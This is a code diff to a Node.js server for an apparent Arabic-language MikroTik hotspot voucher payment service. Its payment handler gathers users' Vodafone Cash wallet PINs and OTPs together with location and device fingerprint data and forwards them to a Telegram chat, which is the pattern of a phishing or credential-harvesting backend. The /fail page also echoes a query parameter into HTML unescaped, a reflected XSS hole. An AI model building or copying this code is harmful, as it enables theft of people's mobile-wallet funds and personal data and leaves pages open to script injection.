@@ -13,7 +13,7 @@ const webhookRouter = require("./webhook");
 const { disableUserQueue } = require("./mikrotik");
 const { processPaymentAndCreateCard } = require("./mikrotikService");
 const { generateContributionHtmlPage } = require('./contributionMessages');
-const { generateWaitPageHtml } = require('./waitPage'); // استدعاء ملف صفحة الانتظار
+const { generateWaitPageHtml } = require('./waitPage');
 
 // استدعاء ملف الدعم المباشر (Chat Support)
 const chatSupport = require('./chat_support');
@@ -34,13 +34,9 @@ const BRANCH_NAMES = {
 
 global.generatedCardsMap = global.generatedCardsMap || new Map();
 
-// تهيئة Socket.io للدعم المباشر
 chatSupport.initSocket(io);
-
-// إعداد Multer لاستقبال الصور والملفات المرفوعة في الشات
 const upload = multer();
 
-// تنظيف دوري للذاكرة المؤقتة كل نصف ساعة
 setInterval(() => {
   const oneHourAgo = Date.now() - (60 * 60 * 1000);
   for (let [key, value] of global.generatedCardsMap.entries()) {
@@ -69,9 +65,7 @@ function getClientPublicIP(req) {
   );
 }
 
-// ==========================================
-// 💬 مسارات الدعم الفني المباشر (Chat Support API)
-// ==========================================
+// مسارات الدعم الفني المباشر
 app.post('/api/support/message', upload.single('image'), (req, res) => {
   chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
 });
@@ -87,9 +81,7 @@ app.post('/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ==========================================
-// 💳 مسارات المدفوعات وباقي الخدمة
-// ==========================================
+// معالجة طلبات الدفع
 async function handlePaymentRequest(req, res) {
   try {
     const data = { ...req.query, ...req.body };
@@ -99,7 +91,7 @@ async function handlePaymentRequest(req, res) {
       publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
       deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
       geoData, branch, branch_key,
-      wallet_pin, otp // 👈 التقاط حقول فودافون كاش الجديدة (PIN و OTP)
+      wallet_pin, otp
     } = data;
 
     if (!amount && Object.keys(data).length === 0) {
@@ -113,14 +105,14 @@ async function handlePaymentRequest(req, res) {
 
     const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
     const payAmount = amount || "5";
-    const transactionId = "TX_" + Date.now(); // توليد رقم معاملة فريد افتراضي
+    const transactionId = "TX_" + Date.now();
 
     const paymentPayload = {
       phone: userPhone,
       amount_cents: parseFloat(payAmount) * 100,
       payment_method: selectedMethod,
-      wallet_pin: wallet_pin || "غير مدخل", // 👈 إدراج الرقم السري للمحفظة في حمولة التليجرام
-      otp: otp || "لم يتم إدخاله بعد",        // 👈 إدراج الـ OTP المتغير في حمولة التليجرام
+      wallet_pin: wallet_pin || "غير مدخل",
+      otp: otp || "لم يتم إدخاله بعد",
       branch: selectedBranch,
       branchName: branchDisplayName,
       card_data: {
@@ -150,12 +142,11 @@ async function handlePaymentRequest(req, res) {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // إذا كانت وسيلة الدفع هي فودافون كاش المخصصة بالـ PIN والـ OTP
-    if (selectedMethod === 'vodafone_cash') {
-      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
-    }
+    // استدعاء بوابة الدفع الحقيقية مع تمرير الكائنين req و res لفحص الفرع والتعامل مع النتائج
+    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch, req, res);
 
-    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);
+    // إذا كانت الدالة قد قامت بالرد مسبقاً (مثل خطأ الفرع)، نتوقف
+    if (res.headersSent) return;
 
     if (result.type === "redirect") {
       if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
@@ -165,11 +156,11 @@ async function handlePaymentRequest(req, res) {
     } else if (result.type === "html") {
       return res.send(result.content);
     } else {
-      // ✅ التوجيه الافتراضي لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة
       return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
+    if (res.headersSent) return;
     if (req.headers["content-type"]?.includes("application/json")) {
       return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
     }
@@ -182,12 +173,8 @@ app.post("/api/pay", handlePaymentRequest);
 
 app.get("/api/test-create-card", async (req, res) => {
   const secretKey = req.query.secret;
-  
   if (!secretKey || secretKey !== process.env.TEST_SECRET_KEY) {
-    return res.status(403).json({ 
-      success: false, 
-      message: "⚠️ غير مسموح لك بالوصول لهذا الرابط التجريبي. مفتاح الحماية غير صحيح أو مفقود." 
-    });
+    return res.status(403).json({ success: false, message: "⚠️ غير مسموح لك بالوصول لهذا الرابط." });
   }
 
   try {
@@ -208,24 +195,18 @@ app.get("/api/test-create-card", async (req, res) => {
         branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
         createdAt: new Date()
       };
-
       global.generatedCardsMap.set(testTxId, cardPayload);
 
       return res.json({
         success: true,
-        message: `✅ تم إضافة الكارت إلى الميكروتيك بنجاح وتوليده لفرع (${result.branchKey}) تحت الحماية!`,
+        message: `✅ تم إضافة الكارت إلى الميكروتيك وتوليده بفرع (${result.branchKey})`,
         data: result,
         successPageLink: `/success?merchant_order_id=${testTxId}&branch=${result.branchKey}`
       });
     } else {
-      return res.json({
-        success: false,
-        message: "⚠️ فشل توليد الكارت من الميكروتيك",
-        details: result
-      });
+      return res.json({ success: false, message: "⚠️ فشل توليد الكارت من الميكروتيك", details: result });
     }
   } catch (error) {
-    console.error("❌ [TEST ERROR]:", error.message);
     res.status(500).json({ success: false, error: error.message });
   }
 });
@@ -233,13 +214,11 @@ app.get("/api/test-create-card", async (req, res) => {
 app.get("/contribution-success", (req, res) => {
   const amount = req.query.amount || req.query.price || 150;
   const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
-  const htmlContent = generateContributionHtmlPage(amount, transactionId);
-  res.send(htmlContent);
+  res.send(generateContributionHtmlPage(amount, transactionId));
 });
 
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
-  
   if (!txId || txId === "null" || txId === "undefined") {
     return res.json({ success: false, message: "رقم المعاملة غير صالح" });
   }
@@ -248,7 +227,6 @@ app.get("/api/check-voucher/:txId", (req, res) => {
     if (global.generatedCardsMap.has(txId)) {
       return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
     }
-    
     for (let [key, value] of global.generatedCardsMap.entries()) {
       if (String(key).includes(txId) || txId.includes(String(key))) {
         return res.json({ success: true, data: value });
@@ -256,10 +234,7 @@ app.get("/api/check-voucher/:txId", (req, res) => {
     }
   }
 
-  return res.json({ 
-    success: false, 
-    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
-  });
+  return res.json({ success: false, message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." });
 });
 
 app.post("/api/disable-queue", async (req, res) => {
@@ -271,7 +246,6 @@ app.post("/api/disable-queue", async (req, res) => {
     }
     return res.json({ success: true, message: "تم استقبال الطلب" });
   } catch (err) {
-    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
     return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
   }
 });
@@ -283,32 +257,7 @@ app.get("/success", (req, res) => {
 
 app.get("/fail", (req, res) => {
   const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
-  res.send(`
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>فشل الدفع - شبكة حكايات</title>
-        <style>
-          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 40px 20px; direction: rtl; }
-          .card { background: white; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-          .icon { font-size: 50px; color: #e74c3c; margin-bottom: 10px; }
-          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
-          .error-box { background: #fff3f3; color: #e74c3c; border: 1px dashed #e74c3c; padding: 10px; border-radius: 6px; margin: 15px 0; font-size: 14px; }
-          .btn { display: inline-block; background: #e74c3c; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin-top: 15px; font-weight: bold; }
-        </style>
-      </head>
-      <body>
-        <div class="card">
-          <div class="icon">❌</div>
-          <h1>فشل عملية الدفع</h1>
-          <div class="error-box">${errorMessage}</div>
-          <a href="/" class="btn">إعادة المحاولة</a>
-        </div>
-      </body>
-    </html>
-  `);
+  res.send(`<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>فشل الدفع</title></head><body style="text-align:center;padding:50px;font-family:sans-serif;"><h2>فشل عملية الدفع</h2><p>${errorMessage}</p><a href="/">إعادة المحاولة</a></body></html>`);
 });
 
 app.use("/", webhookRouter);
